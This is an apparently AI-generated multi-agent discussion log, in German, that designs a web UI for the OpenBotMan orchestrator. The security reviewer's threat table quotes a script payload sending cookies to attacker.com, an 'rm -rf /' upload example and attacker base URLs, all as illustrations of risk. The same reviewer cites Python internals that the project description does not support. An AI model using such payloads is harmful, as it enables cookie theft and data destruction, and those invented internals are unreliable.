# Discussion: # OpenBotMan Web-UI / UX Konzept

## Ausgangslage

OpenBotMan ist ein Multi-Agent AI Orchestrator, der mehrere KI-Experten zu einem Thema diskutieren lässt und einen Konsens findet. Aktuell gibt es:

### Bestehende Interfaces
1. **CLI** (`pnpm cli discuss "Thema"`) - Terminal-basiert
2. **VSCode Extension** - IDE-Integration mit Live-Output
3. **HTTP API** (`POST /api/v1/discuss`) - Programmatischer Zugang

### Architektur
```
┌─────────────────────────────────────────────────────────────┐
│                    OpenBotMan Monorepo                       │
├─────────────────────────────────────────────────────────────┤
│  packages/                                                   │
│  ├── api-server/     → HTTP API (Express, Port 8080)        │
│  ├── cli/            → Command Line Interface               │
│  ├── orchestrator/   → Kern-Logik, Provider-Abstraktion     │
│  ├── protocol/       → Shared Types                         │
│  └── ide-vscode/     → VSCode Extension                     │
├─────────────────────────────────────────────────────────────┤
│  config.yaml         → Zentrale Konfiguration               │
│  .env                → Secrets (API Keys)                   │
└─────────────────────────────────────────────────────────────┘
```

### Aktuelle Config-Struktur (config.yaml)

```yaml
discussion:
  model: "claude-sonnet-4-20250514"  # Default Model
  timeout: 60                         # Sekunden pro Agent
  maxRounds: 10                       # Max Konsens-Runden
  maxContext: 100000                  # Max Kontext in Bytes
  outputDir: "./discussions"          # Ergebnis-Speicherort

  # Modulare Prompts (zentral definiert, per ID referenziert)
  prompts:
    software-architect:
      systemPrompt: "Du bist ein erfahrener Software-Architekt..."
    software-developer:
      systemPrompt: "Du bist ein Senior Developer..."
    software-researcher:
      systemPrompt: "Du bist ein Research Analyst..."
    software-reviewer:
      systemPrompt: "Du bist ein Security & Quality Expert..."

  # Agenten-Definitionen
  agents:
    - id: planner
      name: "Strategic Planner"
      role: architect
      emoji: "🎯"
      provider: google           # Provider: google, ollama, openai, claude-cli, claude-api
      model: gemini-2.0-flash
      promptId: software-architect  # Referenz auf Prompt

    - id: coder
      name: "Senior Developer"
      role: coder
      emoji: "💻"
      provider: ollama           # Lokales LLM
      model: qwen3-coder:30b
      promptId: software-developer

    - id: researcher
      name: "Research Analyst"
      role: researcher
      emoji: "🔬"
      provider: openai
      model: qwen/qwen3-coder-30b
      baseUrl: http://localhost:1234/v1  # LM Studio
      promptId: software-researcher

    - id: reviewer
      name: "Security & Quality Expert"
      role: reviewer
      emoji: "🔍"
      provider: claude-cli       # Claude CLI
      model: claude-sonnet-4-20250514
      promptId: software-reviewer

  # Teams (vordefinierte Agent-Gruppen)
  teams:
    - id: full
      name: "🌟 Volles Team (4 Experten)"
      description: "Alle Experten für umfassende Analyse"
      agents: [planner, coder, researcher, reviewer]
      default: true
      workflows: [full-analysis, architecture]

    - id: quick
      name: "⚡ Schnelle Analyse"
      description: "Planner + Reviewer für schnelle Einschätzung"
      agents: [planner, reviewer]

    - id: code-review
      name: "💻 Code Review"
      agents: [coder, reviewer]
      workflows: [code-review, code-quality]

    - id: security
      name: "🔒 Security Fokus"
      agents: [researcher, reviewer]
      workflows: [security-review]

    - id: local-only
      name: "🏠 Nur Lokal (kostenlos)"
      description: "Ollama + LM Studio - keine API-Kosten"
      agents: [coder, researcher]
      workflows: [performance]

    - id: cloud-only
      name: "☁️ Nur Cloud (schnell)"
      agents: [planner, reviewer]
```

### Unterstützte Provider
| Provider | Beschreibung | API Key nötig? |
|----------|--------------|----------------|
| `google` | Google Gemini | Ja (GOOGLE_API_KEY) |
| `openai` | OpenAI GPT / kompatible APIs | Ja (OPENAI_API_KEY) |
| `claude-api` | Anthropic Claude SDK | Ja (ANTHROPIC_API_KEY) |
| `claude-cli` | Claude CLI (lokale Auth) | Nein |
| `ollama` | Lokale LLMs via Ollama | Nein |

### API Endpoints
```
GET  /health              → Health Check
GET  /api/v1/teams        → Liste aller Teams
POST /api/v1/discuss      → Diskussion starten
GET  /api/v1/jobs/:id     → Job-Status abfragen
```

### Features
1. **Multi-Round Consensus** - Agenten diskutieren bis Konsens erreicht
2. **Async Jobs** - Langläufige Diskussionen im Hintergrund
3. **Workspace/Include** - Projektdateien als Kontext mitgeben
4. **Per-Agent Provider** - Jeder Agent kann anderen Provider/Model nutzen
5. **Workflow-Teams** - Automatische Team-Auswahl basierend auf Workflow-Typ

### Bekannte Pain Points
1. Config-Änderungen erfordern YAML-Editing und Server-Neustart
2. Keine Übersicht über laufende/vergangene Jobs außer in Logs
3. Prompt-Anpassungen sind umständlich
4. Provider-Status (online/offline) nicht sichtbar
5. Keine Kosten-Übersicht (API-Calls)

---

## Aufgabe

Entwickelt ein **Web-UI Konzept** für OpenBotMan mit folgenden Anforderungen:

### Must-Have Features
1. **Dashboard** - Übersicht über laufende/abgeschlossene Diskussionen
2. **Neue Diskussion starten** - Topic eingeben, Team/Agents wählen, Workspace optional
3. **Live-Ansicht** - Agent-Responses in Echtzeit verfolgen
4. **Ergebnis-Ansicht** - Konsens, Action Items, Export (Markdown/PDF)

### Nice-to-Have Features
1. **Agent-Verwaltung** - Agents erstellen/bearbeiten/löschen
2. **Team-Verwaltung** - Teams zusammenstellen
3. **Prompt-Editor** - System-Prompts bearbeiten
4. **Provider-Status** - Welche Provider sind verfügbar/online
5. **Kosten-Tracking** - API-Kosten pro Diskussion

### Technische Rahmenbedingungen
- Muss mit bestehendem Express API-Server integrieren
- TypeScript bevorzugt
- Responsive Design (Desktop + Tablet)
- Keine Benutzer-Authentifizierung (lokales Tool)

### Offene Fragen
1. **Framework** - React, Vue, Svelte, oder anderes?
2. **Styling** - Tailwind, CSS-in-JS, Component Library?
3. **State Management** - Wie mit Echtzeit-Updates umgehen?
4. **Hosting** - Statisch serviert vom API-Server oder separater Build?

Bitte entwickelt ein konkretes UX-Konzept mit:
- Screen-Beschreibungen
- User Flow
- Technologie-Empfehlungen
- Implementierungs-Roadmap (MVP → Full)

**Date:** 2026-02-07 18:11
**Participants:** Strategic Planner (gemini-2.0-flash), Senior Developer (qwen3-coder:30b), Research Analyst (openai/gpt-oss-20b), Security & Quality Expert (gpt-oss:120b-cloud)
**Rounds:** 1
**Status:** ✅ CONSENSUS REACHED
**Duration:** 103s

---

## Round 1/10

### [Strategic Planner] 🎯 ARCHITECT (gemini-2.0-flash via Gemini)

Okay, hier ist mein Vorschlag für ein Web-UI-Konzept für OpenBotMan, unter Berücksichtigung der gegebenen Rahmenbedingungen und Pain Points.

### UX-Konzept: OpenBotMan Web-UI

**Ziel:** Eine intuitive und effiziente Web-Oberfläche zur Steuerung und Überwachung von OpenBotMan-Diskussionen.

**Technologie-Stack:**

*   **Framework:** React (breite Akzeptanz, viele Komponentenbibliotheken, gute TypeScript-Unterstützung)
*   **Styling:** Tailwind CSS (Utility-First, schnelle Entwicklung, einheitliches Design)
*   **State Management:** Zustand über React Context + Websockets für Echtzeit-Updates
*   **UI-Komponenten:** Eine Komponente-Bibliothek wie Shadcn UI (Tailwind-basiert, zugänglich, anpassbar)
*   **Backend-Kommunikation:** `fetch` API oder Axios für HTTP-Requests, Websocket-Client
*   **Diagramme/Visualisierung:** Mermaid.js für Workflow-Visualisierung

**Architektur-Diagramm:**

```ascii
┌───────────────────────┐     HTTP API     ┌───────────────────────┐
│    React Web-UI       ├──────────────────►│   OpenBotMan API      │
│  (localhost:3000)      │◄──────────────────┤  (localhost:8080)      │
│                       │     Websockets   │                       │
│  - Dashboard          ├──────────────────►│  - Express.js         │
│  - Job-Ansicht        │◄──────────────────┤  - Orchestrator       │
│  - Agent-Verwaltung   │                  │                       │
│  - Config-Editor      │                  │                       │
└───────────────────────┘                  └───────────────────────┘
```

**User Flows und Screen-Beschreibungen:**

1.  **Dashboard:**

    *   **Übersicht:** Laufende Jobs (Status, Topic, Team), abgeschlossene Jobs (Ergebnis, Datum)
    *   **Elemente:**
        *   Job-Liste (tabelleartig mit Filtern/Sortierung)
        *   "Neue Diskussion starten"-Button
        *   Globale Statusanzeige (Provider-Verfügbarkeit)
    *   **Zustand:** Abrufen der Job-Liste von der API (`GET /api/v1/jobs`)

2.  **Neue Diskussion starten:**

    *   **Eingabemaske:**
        *   Topic (Textfeld)
        *   Team-Auswahl (Dropdown mit Beschreibungen) oder Agenten-Auswahl (Checkboxen)
        *   Workspace-Upload (optional)
        *   "Start"-Button
    *   **Zustand:** Abrufen der Team-Liste (`GET /api/v1/teams`), Senden der Anfrage (`POST /api/v1/discuss`)
    *   **Nach dem Start:** Weiterleitung zur Job-Ansicht

3.  **Live-Ansicht (Job-Ansicht):**

    *   **Echtzeit-Updates:** Agent-Responses, Konsens-Fortschritt
    *   **Elemente:**
        *   Job-Details (Topic, Team, Status)
        *   Agent-Responses (chronologisch, mit Agent-Name/Emoji)
        *   Mermaid.js Workflow-Visualisierung
        *   Fortschrittsbalken für Konsens
    *   **Zustand:** Websocket-Verbindung für Echtzeit-Updates, initiale Daten von der API (`GET /api/v1/jobs/:id`)

4.  **Ergebnis-Ansicht (Job-Ansicht nach Abschluss):**

    *   **Konsens:** Zusammenfassung des Ergebnisses
    *   **Action Items:** Liste der identifizierten Aufgaben
    *   **Export:** Markdown/PDF-Download
    *   **Elemente:**
        *   Konsens-Text (formatierter Text)
        *   Action-Item-Liste (Checkboxen, bearbeitbar)
        *   Download-Buttons
        *   ggf. Kosten-Übersicht (wenn implementiert)

5.  **Agent-Verwaltung:**

    *   **Liste der Agents:** Name, Provider, Model, Prompt
    *   **Funktionen:** Erstellen, Bearbeiten, Löschen
    *   **Formular:** Felder für Agent-Konfiguration (analog zu `config.yaml`)
    *   **Zustand:** CRUD-Operationen auf der API (`GET/POST/PUT/DELETE /api/v1/agents`)

6.  **Team-Verwaltung:**

    *   **Liste der Teams:** Name, Beschreibung, Agents
    *   **Funktionen:** Erstellen, Bearbeiten, Löschen
    *   **Formular:** Felder für Team-Konfiguration (analog zu `config.yaml`)
    *   **Zustand:** CRUD-Operationen auf der API (`GET/POST/PUT/DELETE /api/v1/teams`)

7.  **Prompt-Editor:**

    *   **Editor:** Monaco Editor (VSCode-ähnlich) für YAML/Text
    *   **Funktionen:** Bearbeiten, Speichern
    *   **Zustand:** CRUD-Operationen auf der API (`GET/PUT /api/v1/prompts/:id`)

8.  **Provider-Status:**

    *   **Anzeige:** Tabelle oder Liste mit Provider-Namen und Status (online/offline)
    *   **Zustand:** Abrufen des Status von der API (`GET /api/v1/providers`)
    *   **Implementierung:** Health-Checks auf den einzelnen Provider-Endpunkten

9.  **Kosten-Tracking:**

    *   **Anzeige:** Kosten pro Diskussion, Gesamtkosten
    *   **Implementierung:** Erfordert Erfassung der API-Nutzung pro Agent/Diskussion

**Implementierungs-Roadmap:**

*   **MVP:**
    1.  Dashboard (Job-Liste, "Neue Diskussion starten")
    2.  Live-Ansicht (mit Agent-Responses)
    3.  Ergebnis-Ansicht (Konsens, Export)
    4.  Integration mit bestehender API
*   **Phase 2:**
    1.  Agent-Verwaltung
    2.  Team-Verwaltung
    3.  Prompt-Editor
*   **Phase 3:**
    1.  Provider-Status
    2.  Kosten-Tracking
    3.  Workflow-Visualisierung

**Offene Fragen:**

*   **Echtzeit-Kommunikation:** Websockets oder Server-Sent Events (SSE)? Websockets sind bidirektional, was für zukünftige Features (z.B. Agent-Interaktion) nützlich sein könnte.
*   **Konfigurations-Management:** Wie werden Änderungen an der `config.yaml` angewendet, ohne den Server neu starten zu müssen?  Ein "Reload"-Button im UI, der die Konfiguration neu lädt, wäre eine Option.
*   **Fehlerbehandlung:** Wie werden Fehler von den LLMs oder der API im UI dargestellt?

**Zusammenfassung:**

Das vorgeschlagene Web-UI-Konzept setzt auf React, Tailwind CSS und eine Komponente-Bibliothek, um eine moderne und responsive Oberfläche zu schaffen.  Die Architektur ist so konzipiert, dass sie mit der bestehenden API integriert werden kann und durch Websockets Echtzeit-Updates ermöglicht.  Die Roadmap priorisiert die Kernfunktionen (MVP) und erweitert diese schrittweise um zusätzliche Features.

[POSITION: SUPPORT]


**Position:** 💡 PROPOSAL

### [Senior Developer] 💻 CODER (qwen3-coder:30b via Ollama)

## Kritische Analyse des Web-UI-Konzepts für OpenBotMan

### Stärken des Vorschlags

1. **Technische Umsetzbarkeit**: Der Vorschlag ist sehr praxisnah und realistisch. React + Tailwind + Shadcn UI ist eine solide Basis, die auch in Produktionsumgebungen eingesetzt wird.

2. **Architektur**: Die getrennte UI- und API-Schicht ist sinnvoll, mit Websockets für Echtzeitupdates – ein guter Ansatz für interaktive Anwendungen.

3. **MVP-Struktur**: Die Roadmap ist sinnvoll aufgeteilt und konzentriert sich auf Kernfunktionen zuerst.

4. **Konsistenz mit bestehendem Code**: Die Verwendung von `fetch`/`axios` und Websockets passt gut zu bestehenden Patterns.

5. **UX-Fokus**: Die Screens und User Flows sind gut strukturiert und decken die wichtigsten Use Cases ab.

### Kritische Punkte und Verbesserungsvorschläge

#### 1. **Zugriff auf `config.yaml` via UI**
- **Problem**: Der Vorschlag erwartet, dass Konfigurationen über die UI editiert werden könnten, aber es wird keine Lösung für die Aktualisierung der laufenden Konfiguration vorgeschlagen.
- **Kritik**: Es ist unklar, wie Änderungen an Agenten/Teams/Prompts im `config.yaml` übernommen werden, ohne den Server neu zu starten.
- **Verbesserungsvorschlag**: 
  - Einführung eines "Reload Config"-Buttons, der via API den Orchestrator zwingt, Konfiguration neu zu laden.
  - Oder: Implementierung eines Hot-Reload-Mechanismus, der Konfigurationsdateien überwacht und bei Änderung automatisch neu lädt.

#### 2. **Kosten-Tracking**
- **Problem**: Kosten-Tracking ist als "Nice-to-Have" aufgeführt, aber keine konkrete Implementierung oder Datenquelle genannt.
- **Kritik**: Ohne echte Kosten-Tracking-Logik ist das Feature nur eine leere UI-Komponente.
- **Verbesserungsvorschlag**:
  - API-Endpunkte zur Erfassung von Token-Verbrauch pro Agent
  - Einführung einer einfachen Kostenberechnung basierend auf Modell-Preisen (z.B. per Konfiguration)

#### 3. **Echtzeit-Kommunikation: Websockets vs SSE**
- **Problem**: Es wird keine klare Entscheidung getroffen, ob Websockets oder Server-Sent Events (SSE) verwendet werden.
- **Kritik**: Für einfache Updates (Job-Status, Agent-Responses) könnten SSE ausreichend sein und einfacher zu implementieren.
- **Verbesserungsvorschlag**: 
  - Verwendung von SSE für Statusupdates, Websockets nur für interaktive Kommunikation (z.B. Agent-Interaktion)
  - Alternativ: Websockets mit einem einfachen Protokoll, das auch für Updates geeignet ist

#### 4. **Performance & Skalierbarkeit**
- **Problem**: Es wird keine Performance-Optimierung für große Jobs oder viele Agenten erwähnt.
- **Kritik**: Bei vielen Agenten oder langen Diskussionen kann die UI schnell überlastet werden.
- **Verbesserungsvorschlag**:
  - Pagination oder Lazy Loading bei der Darstellung von Agent-Responses
  - Caching von Agent-Responses auf Client-Seite
  - Limitierung der Anzahl der angezeigten Agenten pro Job

#### 5. **Fehlerbehandlung**
- **Problem**: Fehlerbehandlung ist nur am Rande angesprochen.
- **Kritik**: LLM-Fehler, Netzwerkprobleme, Timeout-Errors müssen robust behandelt werden.
- **Verbesserungsvorschlag**:
  - Fehlermeldungen im UI anzeigen
  - Retry-Mechanismen implementieren
  - Logging auf Client-Seite

#### 6. **Komponentenbibliothek**
- **Problem**: Es wird Shadcn UI erwähnt, aber keine konkrete Integration beschrieben.
- **Kritik**: Shadcn UI erfordert manuelle Konfiguration und Anpassung, was bei MVP nicht ideal ist.
- **Verbesserungsvorschlag**:
  - Alternativ: Verwendung von Tailwind + eigenständige Komponenten
  - Oder: Einbindung von MUI oder Chakra UI, die schneller zum Einsatz kommen

### Fazit

Das Konzept ist sehr gut durchdacht und praktisch umsetzbar. Es deckt die Kernfunktionen ab und ist strukturiert. Allerdings gibt es einige technische Details, die noch geklärt oder verbessert werden sollten, um die Zuverlässigkeit und Wartbarkeit zu erhöhen.

### [POSITION: SUPPORT_WITH_CONDITIONS]

**Bedingungen:**

1. **Konfigurationsmanagement**: Es muss ein Mechanismus implementiert werden, um Änderungen an der Konfiguration ohne Neustart des Servers zu ermöglichen (Reload-Button oder Hot-Reload).
2. **Kosten-Tracking**: Ein einfaches Kostenmodell muss implementiert werden, um das Feature sinnvoll zu machen.
3. **Fehlerbehandlung**: Robuste Fehlerbehandlung und Logging müssen implementiert werden.
4. **Performance**: Optimierungen für große Jobs und viele Agenten sind erforderlich.
5. **Echtzeit-Kommunikation**: Klare Entscheidung zwischen Websockets und SSE, ggf. Hybridansatz.

Diese Punkte sollten im nächsten Schritt konkretisiert werden, bevor das Projekt in die Entwicklung geht.

**Position:** ☑️ SUPPORT_WITH_CONDITIONS

### [Research Analyst] 🔬 RESEARCHER (openai/gpt-oss-20b via LM Studio)

## Kritische Analyse des vorgeschlagenen Web‑UI Konzepts

| Thema | Bewertung | Warum |
|-------|-----------|-------|
| **Framework & Ökosystem** | ✅  | React + TypeScript ist die branchenübliche Wahl, bietet eine große Community und viele Komponentenbibliotheken. |
| **Styling / Design System** | ✅  | Tailwind + Shadcn UI liefert ein konsistentes, leichtgewichtiges UI ohne eigene CSS‑Schwelle. Für ein internes Tool reicht das aus. |
| **State‑Management & Echtzeit** | ⚠️  | React Context allein ist für komplexe Live‑Updates (mehrere Agenten, Fortschritt, Fehler) nicht ideal. Zustand mit Zustand‑ oder Redux‑Toolkit + WebSocket‑Layer wäre robuster. |
| **Backend‑Integration** | ✅  | Verwendung von `fetch`/Axios und ein dedizierter Websocket‑Client passt zu Express‑API. |
| **Feature‑Set (MVP)** | ✅  | Dashboard, neue Diskussion, Live‑Ansicht & Ergebnis‑Export decken die Kernanforderungen ab. |
| **Nice‑to‑Have** | ⚠️  | Agent/Team/Prompt‑Management erfordern CRUD‑Endpunkte im Backend, die aktuell nicht existieren. Diese Features sind erst „nice‑to‑have“, sollten aber als spätere Releases geplant werden. |
| **Kosten‑Tracking** | ❌  | Ohne ein Tracking‑System für API‑Calls (z.B. OpenAI Billing API oder eigene Logging) ist diese Funktion unrealistisch. |
| **Provider‑Status** | ⚠️  | Erfordert Health‑Checks der externen Endpunkte. Ein einfacher `/health`‑Endpoint pro Provider wäre nötig. |
| **Deployment & Hosting** | ✅  | Statisches Build im `api-server/public` oder als separater Container ist flexibel und einfach zu deployen. |
| **UX / User Flow** | ✅  | Der vorgeschlagene Fluss (Dashboard → Neue Diskussion → Live‑Ansicht → Ergebnis) ist logisch und entspricht den Bedürfnissen von Entwicklern/Teams. |

### Detaillierte Punkte

1. **Echtzeit‑Kommunikation**
   - *WebSockets* sind sinnvoll, aber die Implementierung muss robust sein: Reconnect‑Logik, Authentifizierung (falls später nötig), und ggf. fallback zu Server‑Sent Events.
   - Für den Live‑Feed empfiehlt sich ein dedizierter Kanal pro Job (`/ws/jobs/:id`) statt globalem Broadcast.

2. **State‑Management**
   - *React Context* reicht für kleine Apps; bei mehreren Jobs, Agenten und Fehlerzuständen wird es unübersichtlich. Vorschlag: `zustand` oder `Redux Toolkit` mit RTK Query für API‑Calls + WebSocket‑Middleware.
   - Zustand ermöglicht schnelle globale Updates (z.B. Job‑Status) ohne Re‑Rendern der gesamten Seite.

3. **Backend‑Erweiterungen**
   - CRUD‑Endpoints für Agents, Teams und Prompts sollten definiert werden (`/api/v1/agents`, `/teams`, `/prompts`).  
   - Für Provider‑Status: `/api/v1/providers/status` kann Health‑Checks von jeder Quelle aggregieren.
   - Kosten‑Tracking erfordert ein Logging‑Modul (z.B. OpenAI Billing API oder eigene DB-Tabelle `usage_logs`) und einen Endpunkt `/api/v1/jobs/:id/usage`.

4. **Security / Auth**
   - Derzeit keine Auth, aber das UI könnte in Zukunft auf externe Benutzer skalieren. Ein einfacher JWT‑Mechanismus wäre sinnvoll, um die Konfiguration zu schützen.

5. **UX‑Optimierungen**
   - Drag‑and‑Drop für Workspace‑Upload (z.B. Dropzone) verbessert den Workflow.
   - Fortschrittsbalken pro Agent + Gesamtfortschritt visualisiert Konsensbildung.
   - Fehlermeldungen von Agents sollten in einer Toast‑/Banner‑Komponente angezeigt werden.

6. **Testing**
   - Unit‑Tests für UI-Komponenten (Jest + React Testing Library) und End-to-End Tests (Cypress) sichern die Qualität bei späteren Features.

7. **Dokumentation & Onboarding**
   - Eine eingebettete Dokumentationsseite (z.B. MDX oder Storybook Docs) erleichtert neue Team‑Mitglieder beim Einstieg.

### Roadmap‑Anpassung

| Phase | Fokus | Backend‑Notwendigkeiten |
|-------|-------|------------------------|
| **MVP** | Dashboard, New Discussion, Live View, Ergebnis Export | `GET /jobs`, `POST /discuss`, `GET /jobs/:id` + WebSocket |
| **Phase 2** | Agent/Team/Prompt‑Management | CRUD‑Endpoints (`/agents`, `/teams`, `/prompts`) |
| **Phase 3** | Provider‑Status, Kosten‑Tracking | Health‑Check‑Endpoint, Usage‑Logging & Reporting |

### Fazit

Der vorgeschlagene Ansatz ist solide und deckt die Kernanforderungen ab. Die größten Risiken liegen in der Skalierbarkeit des Echtzeit‑Systems und den fehlenden Backend‑Endpunkten für Nice‑to‑Have Features. Mit einer kleinen Anpassung (robusteres State‑Management, Vorbereitung von CRUD‑APIs) kann das Konzept erfolgreich umgesetzt werden.

**[POSITION: SUPPORT_WITH_CONDITIONS]**

- **Bedingungen:**  
  1. Implementierung eines zustand/Redux‑basierten globalen Stores mit WebSocket‑Middleware.  
  2. Vorhandensein der benötigten CRUD‑Endpoints für Agents, Teams und Prompts (oder zumindest ein Stub).  
  3. Grundlegendes Logging für Kosten‑Tracking oder klare Entscheidung, dass diese Feature erst in Phase 4 kommt.

**Position:** ☑️ SUPPORT_WITH_CONDITIONS

### [Security & Quality Expert] 🔍 REVIEWER (gpt-oss:120b-cloud via Ollama)

**Kritische Analyse des Web‑UI‑Konzepts (Sicherheits‑, Performance‑, Edge‑Case‑ und Qualitäts‑Perspektive)**  

---

## 1. Sicherheits‑ und Vulnerability‑Risiken  

| Risiko | Warum problematisch | Beispiel | Priorität |
|--------|---------------------|----------|-----------|
| **API‑Key‑Leakage** | Das UI greift per HTTP‑Requests auf den Express‑Server zu. Wenn dort **keine Authentifizierung** (z. B. JWT‑Token) implementiert ist, kann ein Angreifer das Frontend manipulieren und die internen Endpunkte ausnutzen – damit auch die **geheimen API‑Keys** (OpenAI, Anthropic etc.) über das Backend preisgeben. | Ein Angreifer ruft `POST /api/v1/discuss` mit einem eigenen Prompt, der über das Backend an Claude weitergeleitet wird. Der Key wird im Server‑Log ausgegeben und kann durch Log‑Exfiltration entwendet werden. | **Hoch** |
| **CSRF / fehlender Same‑Site‑Schutz** | Ohne Auth‑Mechanismus wird das System anfällig für Cross‑Site‑Request‑Forgery, weil jede Anfrage vom Browser (oder einem bösartigen Skript) akzeptiert wird. | Ein präparierter Link auf einer anderen Site löst automatisch `POST /api/v1/discuss` aus und startet kostspielige LLM‑Aufrufe. | **Hoch** |
| **XSS via LLM‑Ausgabe** | LLM‑Antworten können beliebigen Text enthalten (z. B. HTML‑Tags). Wird dieser Text ungefiltert in das DOM injiziert (z. B. in der Live‑Ansicht), können Angreifer **Stored‑XSS** erreichen. | Ein Agent liefert den String `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>` als Teil einer Antwort. Wird das unverändert gerendert → Skript‑Ausführung. | **Mittel‑Hoch** |
| **Ungeprüfte Benutzer‑Uploads (Workspace)** | Das UI erlaubt das Hochladen von Projektdateien. Ohne **Virenscan / MIME‑Check** können schädliche Binärdateien oder Skripte auf dem Server landen und bei späterer Ausführung (z. B. durch `subprocess.run` in `CLIRunner`) zu Remote‑Code‑Execution führen. | Ein Nutzer lädt eine `.sh`‑Datei mit `rm -rf /` hoch; das Orchestrator‑Modul verarbeitet sie als Text‑Input für ein LLM‑Prompt und das Ergebnis wird per `subprocess` ausgeführt. | **Hoch** |
| **Rate‑Limiting / DoS** | Das System kann beliebig viele Diskussionen starten, jede Diskussion kann mehrere Runden und mehrere LLM‑Aufrufe erzeugen. Ohne **Rate‑Limiting** kann ein interner oder externer Angreifer das Backend und die externen LLM‑APIs überfluten → Kostenexplosion und Service‑Ausfall. | Ein Bot startet 10 000 Diskussionen pro Minute → API‑Kosten in die Höhe schießen, Server‑Speicher erschöpft. | **Mittel** |
| **Fehlende Input‑Validierung (YAML/JSON)** | Änderungen an `config.yaml` oder an Prompt‑Inhalten werden aus dem UI heraus geschrieben. Ohne Schema‑Validierung können fehlerhafte oder bösartige Konfigurationen (z. B. `provider: "http://evil.com"`) in den Orchestrator gelangen. | Ein Nutzer fügt einen Provider‑Eintrag mit `baseUrl: "http://attacker.local"` hinzu – das System ruft damit ungewollt fremde Endpunkte auf. | **Mittel** |

### Mitigation‑Vorschläge (nach Priorität)

1. **Auth‑Layer einführen** – mindestens ein **API‑Key‑basiertes Token** (z. B. ein statisches Bearer‑Token, das im `.env` liegt) und **CSRF‑Protection** (SameSite‑Cookies oder Double‑Submit‑Token).  
2. **CSP & Helmet** – HTTP‑Header‑Hardening (Content‑Security‑Policy, X‑Content‑Type‑Options, Referrer‑Policy).  
3. **Sanitisation von LLM‑Ausgaben** – vor dem Einfügen in das DOM mit einer Bibliothek wie DOMPurify; für Markdown‑Renderings einen Safe‑Renderer (z. B. `react-markdown` mit `rehype-sanitize`).  
4. **Upload‑Validierung & Sandbox** – MIME‑Type‑Check, max. Dateigröße, Virenscan (ClamAV) und **keine direkte Ausführung** von hochgeladenen Dateien; wenn nötig, nur als Text‑Input an LLM weitergeben.  
5. **Rate‑Limiting & Quotas** – per IP oder per Token (z. B. `express-rate-limit`), sowie **Kosten‑Warnungen** im UI, wenn ein Diskussion‑Job ein definiertes Budget überschreitet.  
6. **Schema‑Validierung** – bei allen Konfig‑Änderungen (Agents, Teams, Prompts) ein JSON‑Schema (z. B. `ajv`) prüfen, bevor Änderungen in die YAML‑Datei geschrieben werden.  

---

## 2. Performance‑Bottlenecks  

| Bottleneck | Auswirkung | Gegenmaßnahme |
|------------|------------|---------------|
| **WebSocket‑Skalierung** | Jeder laufende Job öffnet mindestens einen WS‑Stream zum UI. Bei vielen gleichzeitigen Jobs kann der Node‑Process schnell an FD‑Limits bzw. Memory‑Limits stoßen. | **Server‑Sent Events (SSE)** für reine Server‑→‑Client‑Updates (weniger Overhead). Alternativ **WebSocket‑Cluster** (z. B. `socket.io` mit `sticky-session`) oder **Redis‑Adapter** für horizontale Skalierung. |
| **LLM‑Response‑Pufferung** | Große Antworten (mehrere MB) werden komplett im Speicher gehalten, bevor sie an das UI gesendet werden → RAM‑Spitzen. | **Streaming‑API** (falls vom Provider unterstützt) nutzen, Daten chunkweise an den Client weiterleiten. |
| **Polling‑Fallback** | Falls WS/SSE nicht verfügbar, könnte das UI auf Polling zurückfallen → unnötige API‑Calls. | Implementiere **exponential back‑off** und **ETag‑basiertes Conditional GET**. |
| **Datei‑Upload‑Speicher** | Workspace‑Dateien werden im Server‑Filesystem abgelegt. Ohne Cleanup kann das schnell den Disk‑Space fressen. | **Temp‑Ordner mit TTL** (z. B. `tmp-promise`), regelmäßiger **Garbage‑Collector** (Cron‑Job). |
| **Render‑Performance** | Live‑Ansicht mit vielen Agent‑Messages kann das React‑DOM verlangsamen (z. B. 200+ Nachrichten). | **Virtualisierung** (`react-window`/`react-virtualized`) für lange Listen, **Debounce** von UI‑Updates. |

---

## 3. Edge‑Cases & Fehlerszenarien  

| Szenario | Problem | Empfohlene Handhabung |
|----------|----------|------------------------|
| **Timeouts bei LLM‑Calls** | `subprocess.run` in `CLIRunner` wirft nach 120 s. Der UI‑Job bleibt im „Running“-Zustand, kein Feedback. | **Heartbeat‑Message** vom Server, UI zeigt „Agent timed out – retry?“. Implementiere **Retry‑Logik** mit Exponential Back‑off. |
| **Partial Failure (ein Agent schlägt fehl)** | Ein Agent (z. B. Claude) liefert Fehler, andere laufen weiter → inkonsistente Konsens‑Ergebnisse. | **Aggregierte Fehlermeldung** im UI, Möglichkeit zum **Manuellen Eingriff** (z. B. „Agent neu starten“). |
| **Ungültige YAML‑Konfiguration** | Beim Reload der Config wirft `yaml.safe_load` einen Fehler → Server‑Restart nötig. | **Validate‑on‑Save** im UI, zeige **Zeilennummer** und **Fehlermeldung**, blockiere das Laden bis zur Korrektur. |
| **Kosten‑Überschreitung** | Nutzer lässt ein teures Modell laufen, das Budget überschreitet. | **Kosten‑Schwelle** im UI konfigurieren, **Warnungen** vor jedem LLM‑Call, Möglichkeit zum **Abbruch** des Jobs. |
| **Netzwerk‑Unterbrechung (Client)** | UI verliert Verbindung, verliert bisherige Live‑Daten. | **Persistente Store** (IndexedDB) für bereits erhaltene Nachrichten, beim Reconnect **Replay‑Log** vom Server anfordern. |
| **Mehrsprachige Prompts** | Prompt‑Editor speichert Unicode‑Zeichen, aber CLI‑Tools erwarten UTF‑8 ohne BOM. | **Encoding‑Check** beim Speichern, ggf. `iconv`‑Konvertierung. |

---

## 4. Code‑Qualität & Wartbarkeit  

* **Typisierung** – React‑Komponenten sollten strikt mit TypeScript‑Interfaces versehen sein (z. B. `Job`, `AgentMessage`).  
* **Separation of Concerns** – UI‑Logik (Hooks) von API‑Service‑Klassen trennen (z. B. `apiClient.ts`).  
* **Feature‑Toggles** – Für optionale Nice‑to‑Have‑Features (Kosten‑Tracking, Provider‑Status) Feature‑Flags einführen, damit das MVP nicht unnötig aufgebläht wird.  
* **Testing** – Unit‑Tests für Service‑Layer (Axios‑Mock, WebSocket‑Mock) und **E2E‑Tests** (Playwright) für kritische Flows (Diskussion starten → Konsens).  
* **CI‑Pipeline** – Lint (`eslint` + `@typescript-eslint`), Format (`prettier`), Security‑Scan (`npm audit`, `snyk`).  

---

## 5. Priorisierte Maßnahmen  

| Priorität | Maßnahme |
|-----------|----------|
| **1 (kritisch)** | Auth‑Layer + CSRF‑Protection, API‑Key‑Isolation, XSS‑Sanitisation, Upload‑Validierung & Sandbox. |
| **2 (hoch)** | Rate‑Limiting + Kosten‑Quoten, WebSocket/SSE Skalierung, Streaming‑Antworten, Config‑Schema‑Validierung. |
